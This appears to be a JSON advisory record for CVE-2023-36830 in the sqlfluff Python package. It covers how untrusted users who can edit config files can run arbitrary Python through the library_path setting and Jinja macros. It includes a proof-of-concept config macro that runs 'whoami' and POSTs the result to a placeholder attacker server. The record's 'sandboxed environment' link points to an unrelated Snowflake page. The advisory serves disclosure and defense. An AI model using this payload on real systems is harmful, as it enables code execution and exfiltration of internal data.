  "Identifier": "CVE-2023-36830",
  "PackageSlug": "pypi/sqlfluff",
  "Title": "SQLFluff users with access to config file, using `libary_path` may call arbitrary python code",
  "Description": "In environments where untrusted users have access to the config files (e.g. `.sqlfluff`), there is a potential security vulnerability where those users could use the `library_path` config value to allow arbitrary python code to be executed via macros. Jinja macros are executed within a [sandboxed environment](https://docs.snowflake.com/en/sql-reference/sql/show-warehouses) but the following example shows how an external url might be called and used to reveal internal information to an external listener:\n\n```ini\n[sqlfluff:templater:jinja]\nlibrary_path = /usr/lib/python3.9/http\n\n[sqlfluff:templater:jinja:macros]\na_macro_def = {{client.HTTPSConnection('\u003cSOME_EXTERNAL_SERVER_YOU_CONTROL\u003e').request('POST', '/', server.os.popen('whoami').read())}}\n```\n\nFor many users who use SQLFluff in the context of an environment where all users _already have fairly escalated privileges_, this may not be an issue - however in larger user bases, or where SQLFluff is bundled into another tool where developers still wish to give users access to supply their on _rule configuration_, this may be an issue.",
